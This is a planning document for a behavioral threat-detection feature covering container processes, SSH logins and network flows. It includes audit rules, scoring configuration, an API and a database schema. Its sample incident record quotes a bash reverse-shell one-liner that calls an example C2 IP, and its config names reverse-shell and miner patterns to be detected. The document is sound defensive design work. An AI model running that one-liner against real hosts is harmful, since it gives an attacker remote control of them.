# ai threat detection

feature id: 4
category: ai & intelligence
primary service: orchestrator agent
effort estimate: large (7-10 pt)
status: planned

## overview

behavioral analysis of container processes, ssh login patterns, and network traffic to detect security threats in real time. the system establishes per-server and per-container behavioral baselines, then flags deviations that may indicate compromise, intrusion, or policy violations.

when a threat is detected, a security incident is raised with supporting evidence, severity classification, and recommended remediation steps.

### goals

- detect compromised containers through abnormal process execution
- identify brute-force ssh attacks and unusual login patterns
- flag anomalous network connections (unexpected egress, port scanning)
- raise structured security incidents with forensic evidence
- integrate with existing alerting and incident management workflows

## architecture

```
┌──────────────────────────────────────────────────────────┐
│                   Data Sources                            │
│  ┌─────────────┐  ┌─────────────┐  ┌──────────────────┐ │
│  │ Process     │  │ SSH Auth    │  │ Network Flow     │ │
│  │ Events      │  │ Logs        │  │ (eBPF / ntopng)  │ │
│  │ (auditd)    │  │ (/var/log/  │  │                  │ │
│  │             │  │  auth.log)  │  │                  │ │
│  └──────┬──────┘  └──────┬──────┘  └────────┬─────────┘ │
└─────────┼────────────────┼──────────────────┼────────────┘
          │                │                  │
          ▼                ▼                  ▼
┌──────────────────────────────────────────────────────────┐
│              Orchestrator Agent                           │
│                                                           │
│  ┌────────────────────────────────────────────────────┐  │
│  │          Behavioral Baseline Engine                  │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────────┐ │  │
│  │  │ Process  │  │ SSH      │  │ Network          │ │  │
│  │  │ Baseline │  │ Baseline │  │ Baseline         │ │  │
│  │  └────┬─────┘  └────┬─────┘  └──────┬───────────┘ │  │
│  │       │              │               │             │  │
│  │       ▼              ▼               ▼             │  │
│  │  ┌────────────────────────────────────────────┐    │  │
│  │  │      Anomaly Scoring Engine                 │    │  │
│  │  │  ┌──────────┐  ┌──────────┐  ┌──────────┐ │    │  │
│  │  │  │ Process  │  │ Auth     │  │ Network  │ │    │  │
│  │  │  │ Scorer   │  │ Scorer   │  │ Scorer   │ │    │  │
│  │  │  └────┬─────┘  └────┬─────┘  └────┬─────┘ │    │  │
│  │  │       │              │              │       │    │  │
│  │  │       ▼              ▼              ▼       │    │  │
│  │  │  ┌────────────────────────────────────┐    │    │  │
│  │  │  │      Aggregated Threat Score       │    │    │  │
│  │  │  └──────────────────┬─────────────────┘    │    │  │
│  │  └─────────────────────┼───────────────────────┘    │  │
│  │                        │                            │  │
│  │                        ▼                            │  │
│  │  ┌────────────────────────────────────────────────┐ │  │
│  │  │          Incident Creator                       │ │  │
│  │  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐ │ │  │
│  │  │  │ Evidence │──│ Severity │──│ Remediation  │ │ │  │
│  │  │  │ Collector│  │ Classify │  │ Suggestions  │ │ │  │
│  │  │  └──────────┘  └──────────┘  └──────────────┘ │ │  │
│  │  └────────────────────────────────────────────────┘ │  │
│  └──────────────────────────────────────────────────────┘  │
│                        │                                   │
│                        ▼                                   │
│              ┌──────────────────┐                          │
│              │  Alert / Notify   │                          │
│              └──────────────────┘                          │
└──────────────────────────────────────────────────────────┘
```

## implementation plan

### phase 1: data collection (2-3 pt)

| step | description | artifacts |
|------|-------------|-----------|
| 1.1 | deploy auditd rules for process monitoring | `audit.rules` capturing execve, fork, file modifications |
| 1.2 | ssh auth log collection agent | tail `auth.log`, parse structured events |
| 1.3 | network flow data collection | ebpf-based per-container traffic monitor or ntopng |
| 1.4 | event normalization pipeline | unified schema: `{event_type, timestamp, source, data}` |
| 1.5 | event buffer & persistence | kafka topic + timescaledb for time-series analysis |

**audit rules:**

```bash
# /etc/audit/rules.d/threat-detection.rules
# Monitor process execution
-w /usr/bin/ -p x -k process_exec
-w /usr/sbin/ -p x -k process_exec
-w /bin/ -p x -k process_exec

# Monitor sensitive file access
-w /etc/passwd -p rwa -k sensitive_file
-w /etc/shadow -p rwa -k sensitive_file
-w /etc/ssh/sshd_config -p wa -k ssh_config

# Monitor container runtime
-w /var/run/docker.sock -p rw -k docker_sock
```

**normalized event schema:**

```yaml
# config/event_schema.yaml
events:
  process:
    fields: [timestamp, host, container_id, pid, ppid, uid, cmdline, exe, cwd, exit_code]
    source: auditd
  ssh_auth:
    fields: [timestamp, host, user, source_ip, auth_method, success, session_id, pid]
    source: auth.log
  network_flow:
    fields: [timestamp, host, container_id, src_ip, src_port, dst_ip, dst_port, proto, bytes, packets, direction]
    source: ebpf
```

### phase 2: behavioral baselines (2 pt)

| step | description | artifacts |
|------|-------------|-----------|
| 2.1 | process baseline per container image | allow-listed binaries, typical command-line patterns |
| 2.2 | ssh login baseline per host | expected users, source ip ranges, login frequency |
| 2.3 | network traffic baseline per container | expected egress destinations, port usage, protocol mix |
| 2.4 | baseline persistence & versioning | baseline snapshots, automatic weekly recalibration |

**baseline model:**

```python
# pseudocode: behavioral_baseline.py
class ProcessBaseline:
    def __init__(self, container_image: str):
        self.allowed_executables: set[str] = set()
        self.allowed_parents: dict[str, set[str]] = {}  # parent -> children
        self.allowed_cmdline_patterns: list[re.Pattern] = []
        self.cpu_quota_us: int = 0
        self.memory_quota_bytes: int = 0
        self.typical_uptime_seconds: float = 0.0

    async def learn(self, events: list[ProcessEvent]):
        """Build baseline from historical events."""
        for ev in events:
            self.allowed_executables.add(ev.exe)
            if ev.ppid_name:
                self.allowed_parents.setdefault(ev.ppid_name, set()).add(ev.exe)

    def is_anomalous(self, event: ProcessEvent) -> AnomalyScore:
        score = 0.0
        if event.exe not in self.allowed_executables:
            score += 0.6  # Unknown binary
        if event.ppid_name and event.ppid_name in self.allowed_parents:
            if event.exe not in self.allowed_parents[event.ppid_name]:
                score += 0.3  # Unusual parent-child relationship
        if self._is_malicious_pattern(event.cmdline):
            score += 0.8  # Known malicious pattern
        return AnomalyScore(score=min(score, 1.0), reasons=self._reasons)
```

### phase 3: anomaly scoring & incident creation (2-3 pt)

| step | description | artifacts |
|------|-------------|-----------|
| 3.1 | process anomaly scorer | compares events against process baseline |
| 3.2 | auth anomaly scorer | geo-ip mismatch, impossible travel, credential stuffing |
| 3.3 | network anomaly scorer | unexpected egress, beaconing detection, port scan detection |
| 3.4 | aggregated threat scoring | weighted combination of sub-scores |
| 3.5 | incident creation & evidence packaging | structured incident with timeline, affected resources, indicators of compromise |
| 3.6 | remediation suggestion engine | lookup table + ml classification for recommended actions |

**scoring config:**

```yaml
# config/threat_scoring.yaml
scoring:
  weights:
    process: 0.35
    auth: 0.35
    network: 0.30

  thresholds:
    incident_critical: 0.85
    incident_warning: 0.60
    incident_info: 0.40
    logging_only: 0.20

  process:
    unknown_binary_weight: 0.6
    unusual_parent_weight: 0.3
    crypto_miner_pattern: 0.9
    reverse_shell_pattern: 0.95
    file_encryption_pattern: 0.9

  auth:
    brute_force_threshold: 5  # failed attempts in window
    brute_force_window_s: 300
    geo_anomaly_weight: 0.5
    impossible_travel_kmh: 1000
    credential_stuffing_threshold: 20
    root_login_weight: 0.3

  network:
    unexpected_egress_weight: 0.7
    known_malicious_ip_weight: 0.9
    tor_exit_node_weight: 0.6
    port_scan_threshold: 20
    dns_tunnel_pattern: 0.85
    data_exfil_bytes_per_s: 104857600  # 100 MB/s
```

**incident structure:**

```json
{
  "id": "inc-20260527-001",
  "severity": "critical",
  "title": "Possible reverse shell on container web-01",
  "description": "Container web-01 (srv-abc123) spawned a process connecting to an external IP on port 4444. The process /bin/bash has an established connection to 198.51.100.42:4444.",
  "score": 0.92,
  "source": "process_anomaly",
  "status": "open",
  "detected_at": "2026-05-27T14:30:00Z",
  "timeline": [
    {"t": "14:29:55", "event": "SSH login from unusual IP 198.51.100.42"},
    {"t": "14:30:00", "event": "Container web-01: /bin/bash spawned by apache2 (unusual parent-child)"},
    {"t": "14:30:02", "event": "Outbound TCP connection from web-01 to 198.51.100.42:4444"},
    {"t": "14:30:05", "event": "Process /bin/bash executing with interactive flags (-i)"}
  ],
  "affected_resources": [
    {"type": "container", "id": "web-01", "server_id": "srv-abc123", "image": "nginx:latest"}
  ],
  "indicators": [
    {"type": "ip", "value": "198.51.100.42", "confidence": 0.9, "context": "C2 server"},
    {"type": "process", "value": "/bin/bash -i >& /dev/tcp/198.51.100.42/4444", "confidence": 0.95}
  ],
  "recommendations": [
    {"action": "isolate_container", "target": "web-01", "description": "Isolate container from network"},
    {"action": "snapshot_and_terminate", "target": "web-01", "description": "Take forensic snapshot, then terminate"},
    {"action": "revoke_keys", "target": "srv-abc123", "description": "Rotate SSH keys and credentials"}
  ]
}
```

### phase 4: response & remediation (1-2 pt)

| step | description | artifacts |
|------|-------------|-----------|
| 4.1 | automated containment actions | network isolation, container stop, user lockout |
| 4.2 | incident lifecycle management | status transitions: `open → investigating → contained → resolved` |
| 4.3 | forensics evidence packaging | log export, process tree, network pcap |
| 4.4 | integration with siem / notification channels | splunk, elk, discord, slack |

## api design

### rest api

#### list incidents

```
GET /api/v1/incidents
  ?severity=critical,warning
  &source=process_anomaly,auth_anomaly,network_anomaly
  &status=open,investigating,contained,resolved
  &affected_resource=web-01
  &from=2026-05-01T00:00:00Z
  &to=2026-05-27T23:59:59Z
  &limit=50
```

response:
```json
{
  "incidents": [
    {
      "id": "inc-20260527-001",
      "severity": "critical",
      "title": "Possible reverse shell on container web-01",
      "score": 0.92,
      "source": "process_anomaly",
      "status": "open",
      "detected_at": "2026-05-27T14:30:00Z",
      "affected_resources": [
        {"type": "container", "id": "web-01", "server_id": "srv-abc123"}
      ]
    }
  ],
  "total": 3,
  "limit": 50,
  "offset": 0
}
```

#### get incident details

```
GET /api/v1/incidents/{id}
```

response: (full incident json as shown above)

#### update incident status

```
PATCH /api/v1/incidents/{id}
```

request:
```json
{
  "status": "investigating",
  "assigned_to": "sre-team",
  "comment": "Investigating reverse shell activity on web-01"
}
```

#### trigger containment action

```
POST /api/v1/incidents/{id}/contain
```

request:
```json
{
  "action": "isolate_container",
  "target": "web-01",
  "reason": "Automated containment of confirmed reverse shell"
}
```

response:
```json
{
  "action_id": "act-789",
  "status": "executing",
  "estimated_completion": "2026-05-27T14:31:00Z"
}
```

#### get baseline status

```
GET /api/v1/threat/baselines
  ?resource=container:web-01
  &type=process,network,auth
```

response:
```json
{
  "baselines": [
    {
      "resource": "container:web-01",
      "type": "process",
      "version": 12,
      "last_calibrated": "2026-05-25T00:00:00Z",
      "total_binaries_known": 24,
      "anomalies_in_window": 2
    }
  ]
}
```

#### acknowledge baseline drift

```
POST /api/v1/threat/baselines/recalibrate
```

request:
```json
{
  "resource": "container:web-01",
  "type": "process",
  "reason": "Application update introduced new binaries"
}
```

## data model

```python
# models/threat_detection.py
@dataclass
class SecurityEvent:
    id: str
    event_type: str           # process / ssh_auth / network_flow
    timestamp: datetime
    host: str
    container_id: str | None
    raw: dict

@dataclass
class Baseline:
    resource_id: str
    resource_type: str        # container / host / image
    baseline_type: str        # process / auth / network
    version: int
    data: dict                # Baseline specifics per type
    last_calibrated: datetime
    event_count: int

@dataclass
class AnomalyScore:
    score: float              # 0.0 - 1.0
    reasons: list[str]
    evidence: list[dict]

@dataclass
class Incident:
    id: str
    severity: str             # critical / warning / info
    title: str
    description: str
    score: float
    source: str               # process_anomaly / auth_anomaly / network_anomaly / aggregated
    status: str               # open / investigating / contained / resolved / dismissed
    detected_at: datetime
    timeline: list[TimelineEntry]
    affected_resources: list[ResourceRef]
    indicators: list[Indicator]
    recommendations: list[Recommendation]
    assigned_to: str | None
    resolved_at: datetime | None
    containment_actions: list[ContainmentAction]

@dataclass
class TimelineEntry:
    timestamp: datetime
    event: str

@dataclass
class Indicator:
    type: str                 # ip / domain / process / file_hash / network_sig
    value: str
    confidence: float
    context: str | None

@dataclass
class Recommendation:
    action: str
    target: str
    description: str

@dataclass
class ContainmentAction:
    id: str
    action_type: str
    target: str
    status: str               # pending / executing / completed / failed
    initiated_by: str
    initiated_at: datetime
    completed_at: datetime | None
```

**database schema:**

```sql
-- Security events (raw, short retention)
CREATE TABLE security_events (
    id              TEXT PRIMARY KEY,
    event_type      TEXT NOT NULL,
    timestamp       TIMESTAMPTZ NOT NULL,
    host            TEXT NOT NULL,
    container_id    TEXT,
    raw             JSONB NOT NULL
) PARTITION BY RANGE (timestamp);

CREATE INDEX idx_events_type_ts ON security_events(event_type, timestamp);

-- Baselines
CREATE TABLE baselines (
    id              SERIAL PRIMARY KEY,
    resource_id     TEXT NOT NULL,
    resource_type   TEXT NOT NULL,
    baseline_type   TEXT NOT NULL,
    version         INTEGER NOT NULL DEFAULT 1,
    data            JSONB NOT NULL,
    last_calibrated TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    event_count     INTEGER DEFAULT 0,
    UNIQUE (resource_id, resource_type, baseline_type, version)
);

-- Incidents
CREATE TABLE incidents (
    id              TEXT PRIMARY KEY,
    severity        TEXT NOT NULL,
    title           TEXT NOT NULL,
    description     TEXT,
    score           DOUBLE PRECISION NOT NULL,
    source          TEXT NOT NULL,
    status          TEXT NOT NULL DEFAULT 'open',
    detected_at     TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    timeline        JSONB DEFAULT '[]',
    affected_resources JSONB DEFAULT '[]',
    indicators      JSONB DEFAULT '[]',
    recommendations JSONB DEFAULT '[]',
    assigned_to     TEXT,
    resolved_at     TIMESTAMPTZ,
    created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_incidents_severity ON incidents(severity);
CREATE INDEX idx_incidents_status ON incidents(status);
CREATE INDEX idx_incidents_source ON incidents(source);

-- Containment actions
CREATE TABLE containment_actions (
    id              TEXT PRIMARY KEY,
    incident_id     TEXT REFERENCES incidents(id),
    action_type     TEXT NOT NULL,
    target          TEXT NOT NULL,
    status          TEXT NOT NULL DEFAULT 'pending',
    initiated_by    TEXT NOT NULL,
    initiated_at    TIMESTAMPTZ DEFAULT NOW(),
    completed_at    TIMESTAMPTZ
);
```

## service assignments

| service | responsibility |
|---------|---------------|
| orchestrator agent | data collection (auditd, auth logs, network flows), behavioral baselines, anomaly scoring, incident creation, containment actions |
| integration service | notification dispatch (discord/slack), siem forwarding, incident management workflow |
| management panel | incident dashboard, timeline view, evidence browser, containment action ui, baseline management |
| discord / slack | critical incident alerts with action buttons (acknowledge, contain, dismiss) |

## configuration reference

```yaml
# config/threat_detection.yaml
collection:
  auditd_rules: "/etc/audit/rules.d/threat-detection.rules"
  auth_log_path: "/var/log/auth.log"
  network:
    method: "ebpf"              # ebpf | ntopng | netflow
    interface: "eth0"
    sampling_rate: 1.0          # 1.0 = all packets
  buffer_size: 10000
  flush_interval_s: 5

baselines:
  calibration_window_days: 14
  auto_recalibrate: true
  recalibrate_interval_hours: 168
  min_events_for_baseline: 1000

incidents:
  auto_contain:
    enabled: false              # opt-in per policy
    max_severity: "critical"
    actions:
      - "isolate_container"
  auto_resolve_after_hours: 72
  max_incidents_per_source_per_hour: 10

integrations:
  siem:
    enabled: false
    target: "syslog+tls://siem.example.com:514"
    format: "cef"               # cef / leef / json
  discord:
    channel: "security-alerts"
    include_evidence: true
  slack:
    channel: "#security"
```

## effort breakdown

| phase | task | pt | dependencies |
|-------|------|----|-------------|
| 1.1 | auditd rule deployment | 0.5 | node access |
| 1.2 | ssh log collection agent | 0.5 | log pipeline |
| 1.3 | network flow data collection | 1 | ebpf / kernel support |
| 1.4 | event normalization pipeline | 0.5 | event schema |
| 1.5 | event buffer & persistence | 0.5 | kafka + timescaledb |
| 2.1 | process baseline engine | 1 | normalized events |
| 2.2 | ssh baseline engine | 0.5 | auth events |
| 2.3 | network baseline engine | 0.5 | network events |
| 2.4 | baseline persistence | 0.5 | db schema |
| 3.1 | process anomaly scorer | 1 | process baseline |
| 3.2 | auth anomaly scorer | 0.5 | ssh baseline |
| 3.3 | network anomaly scorer | 0.5 | network baseline |
| 3.4 | aggregated threat scoring | 0.5 | all scorers |
| 3.5 | incident creation | 1 | aggregated score |
| 3.6 | remediation suggestions | 0.5 | incident data |
| 4.1 | containment actions | 0.5 | cloud/docker api |
| 4.2 | incident lifecycle | 0.25 | state machine |
| 4.3 | forensics packaging | 0.5 | evidence store |
| 4.4 | siem/notification integration | 0.5 | integration service |
| | total | 10.75 | |

## risks & mitigations

| risk | impact | mitigation |
|------|--------|------------|
| false positives cause alert fatigue | ignored real threats | baseline calibration, configurable thresholds, feedback loop for tuning |
| ebpf/kernel compatibility | missing network events | fallback to ntopng or tcpdump-based collection |
| baseline drift after updates | incorrect anomaly flags | auto-recalibration after deployments, grace period post-update |
| performance overhead of monitoring | cpu/memory cost | sampling for high-traffic hosts, configurable event rate limits |
| containment action causes outage | service disruption | require human approval for auto-contain, pre-check dependencies |

## metrics & kpis

| metric | target | measurement |
|--------|--------|-------------|
| mean time to detect (mttd) | < 60s | time from event to incident creation |
| mean time to contain (mttc) | < 5min | time from incident to containment action |
| true positive rate | > 90% | confirmed incidents / total incidents |
| false positive rate | < 10% | false incidents / total incidents |
| baseline recalibration time | < 30min | full pipeline time for a single resource |
| containment action success rate | > 99% | successful actions / total actions executed |
